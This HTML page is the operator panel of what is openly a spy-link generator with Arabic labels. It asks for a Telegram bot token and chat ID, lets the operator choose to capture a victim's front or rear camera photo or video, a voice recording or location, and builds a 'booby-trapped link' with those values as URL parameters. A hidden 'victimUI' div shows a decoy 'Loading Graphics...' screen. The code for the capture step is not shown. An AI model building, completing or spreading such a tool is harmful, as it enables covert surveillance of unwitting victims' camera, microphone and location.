<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro-Mohamed Morsy</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ff00; --dark-bg: #000; }
        body, html { margin: 0; padding: 0; background: var(--dark-bg); font-family: 'Cairo', sans-serif; color: var(--neon); overflow: hidden; height: 100vh; }
        canvas { position: fixed; top: 0; left: 0; z-index: 1; }
        #adminPanel { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(12px); border: 1px solid rgba(0, 255, 0, 0.2); padding: 15px 20px; border-radius: 15px; width: 85%; max-width: 340px; box-shadow: 0 0 25px rgba(0, 0, 0, 0.8); }
        h3 { text-align: center; margin-bottom: 12px; font-size: 16px; text-shadow: 0 0 8px var(--neon); }
        input[type="text"] { width: 100%; padding: 10px; background: rgba(0, 0, 0, 0.7); border: 1px solid rgba(0, 255, 0, 0.3); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 12px; margin-bottom: 8px; }
        .feature-item { background: rgba(0, 255, 0, 0.05); padding: 7px 10px; margin: 5px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(0, 255, 0, 0.1); cursor: pointer; }
        .feature-item span { font-size: 12px; color: #fff; }
        input[type="radio"] { accent-color: var(--neon); width: 16px; height: 16px; }
        .main-btn { width: 100%; padding: 12px; background: transparent; color: var(--neon); border: 1px solid var(--neon); font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 10px; font-size: 13px; transition: 0.3s; }
        .main-btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        #out { margin-top: 15px; display: none; text-align: center; }
        .copy-btn { width: 100%; background: #00ff00; color: #000; border: none; padding: 12px; cursor: pointer; border-radius: 10px; font-weight: 900; font-size: 14px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); transition: 0.3s; }
        .copy-btn:hover { background: #05ff05; box-shadow: 0 0 30px #00ff00; }
        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="adminPanel">
        <div class="card">
            <h3>BY.MOHAMED MORSY</h3>
            <input type="text" id="tid" placeholder="ادخل ID CHAT">
            <input type="text" id="tkn" placeholder="ادخل BOT TOKEN">
            <div id="features">
                <label class="feature-item"><span>📸 صورة (أمامية)</span><input type="radio" name="feat" value="f_cam" checked></label>
                <label class="feature-item"><span>📸 صورة (خلفية)</span><input type="radio" name="feat" value="b_cam"></label>
                <label class="feature-item"><span>🎥 فيديو (أمامي)</span><input type="radio" name="feat" value="f_vid"></label>
                <label class="feature-item"><span>🎥 فيديو (خلفي)</span><input type="radio" name="feat" value="b_vid"></label>
                <label class="feature-item"><span>🎤 تسجيل صوتي</span><input type="radio" name="feat" value="voice"></label>
                <label class="feature-item"><span>📍 تحديد الموقع</span><input type="radio" name="feat" value="loc"></label>
            </div>
            <button class="main-btn" onclick="generate()">انشاء رابط ملغم</button>
            <div id="out">
                <button class="copy-btn" onclick="copyLink()"> نسخ الرابط</button>
            </div>
        </div>
    </div>

    <div id="victimUI">
        <div style="color:#0f0; font-size: 20px; font-weight: bold;">Loading Graphics...</div>
    </div>

    <script>
        // Matrix Animation
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "0123456789$#&@*?!+";
        const fontSize = 10;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(0);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        let finalLink = "";

        function generate() {
            const tid = document.getElementById('tid').value;
            const tkn_in = document.getElementById('tkn').value;
            const feat = document.querySelector('input[name="feat"]:checked').value;
            if(!tid || !tkn_in) return alert("قم ب ادخال ال tokin,id");
            
            finalLink = window.location.origin + window.location.pathname + "?i=" + tid + "&t=" + tkn_in + "&type=" + feat;
            document.getElementById('out').style.display = 'block';
        }

        function copyLink() {
            const tempInput = document.createElement("textarea");
            tempInput.value = finalLink;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand("copy");
            document.body.removeChild(tempInput);
            alert("تم النسخ");
        }
    </script>
</body>
</html>
